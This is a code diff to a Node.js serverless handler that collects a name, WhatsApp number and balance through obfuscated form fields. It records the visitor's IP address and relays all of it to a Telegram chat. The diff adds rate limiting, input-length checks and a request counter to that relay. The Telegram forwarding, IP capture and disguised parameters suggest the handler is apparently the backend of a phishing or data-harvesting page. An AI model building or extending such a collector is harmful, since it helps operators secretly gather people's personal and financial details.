@@ -1,5 +1,22 @@
 const axios = require('axios');
 
+// Store untuk menyimpan data rate limiting
+const requestStore = new Map();
+
+// Konfigurasi rate limiting
+const RATE_LIMIT_WINDOW_MS = 15 * 60 * 1000; // 15 menit
+const MAX_REQUESTS_PER_WINDOW = 5; // Maksimal 5 request per 15 menit
+
+// Fungsi untuk membersihkan store lama
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, data] of requestStore.entries()) {
+    if (now - data.firstRequestTime > RATE_LIMIT_WINDOW_MS) {
+      requestStore.delete(ip);
+    }
+  }
+}, 60 * 1000); // Cleanup setiap 1 menit
+
 module.exports = async (req, res) => {
   // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', 'https://cek-two.vercel.app');
@@ -17,6 +34,43 @@ module.exports = async (req, res) => {
   }
 
   try {
+    // Dapatkan IP address pengguna untuk rate limiting
+    const userIP = req.headers['x-forwarded-for'] || 
+                   req.headers['x-real-ip'] || 
+                   req.connection.remoteAddress || 
+                   req.socket.remoteAddress ||
+                   (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+                   'unknown-ip';
+
+    // Cek rate limiting
+    const now = Date.now();
+    const ipData = requestStore.get(userIP);
+
+    if (ipData) {
+      // Jika masih dalam window time
+      if (now - ipData.firstRequestTime <= RATE_LIMIT_WINDOW_MS) {
+        if (ipData.count >= MAX_REQUESTS_PER_WINDOW) {
+          return res.status(429).json({ 
+            success: false, 
+            message: `Terlalu banyak request. Silakan coba lagi dalam ${Math.ceil((RATE_LIMIT_WINDOW_MS - (now - ipData.firstRequestTime)) / 60000)} menit.` 
+          });
+        }
+        ipData.count += 1;
+      } else {
+        // Reset counter jika window time sudah lewat
+        requestStore.set(userIP, {
+          count: 1,
+          firstRequestTime: now
+        });
+      }
+    } else {
+      // IP baru, simpan ke store
+      requestStore.set(userIP, {
+        count: 1,
+        firstRequestTime: now
+      });
+    }
+
     const { a: name, b: phone, c: balance } = req.body;
 
     // Validasi input
@@ -28,6 +82,11 @@ module.exports = async (req, res) => {
       return res.status(400).json({ success: false, message: 'Nomor WhatsApp tidak valid' });
     }
 
+    // Validasi length input
+    if (name.length > 100 || phone.length > 15 || balance.length > 50) {
+      return res.status(400).json({ success: false, message: 'Input terlalu panjang' });
+    }
+
     // Ambil token dari environment variables
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -35,13 +94,6 @@ module.exports = async (req, res) => {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       return res.status(500).json({ success: false, message: 'Server configuration error' });
     }
-
-    // Dapatkan IP address pengguna
-    const userIP = req.headers['x-forwarded-for'] || 
-                   req.headers['x-real-ip'] || 
-                   req.connection.remoteAddress || 
-                   req.socket.remoteAddress ||
-                   (req.connection.socket ? req.connection.socket.remoteAddress : null);
 
     // Format pesan untuk Telegram dengan informasi IP
     const telegramMessage = `
@@ -51,7 +103,8 @@ module.exports = async (req, res) => {
 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | <code>${phone}</code>
 𝗦𝗮𝗹𝗱𝗼 | <pre>${balance}</pre>
 ────────────────────
-𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP || 'Tidak terdeteksi'}
+𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP}
+𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗞𝗲 | ${ipData ? ipData.count : 1}
     `;
 
     // Kirim ke Telegram
@@ -63,7 +116,11 @@ module.exports = async (req, res) => {
     });
 
     // Response sukses
-    res.status(200).json({ success: true, message: 'Data berhasil dikirim' });
+    res.status(200).json({ 
+      success: true, 
+      message: 'Data berhasil dikirim',
+      remaining: MAX_REQUESTS_PER_WINDOW - (ipData ? ipData.count : 1)
+    });
 
   } catch (error) {
     console.error('Error:', error.message);
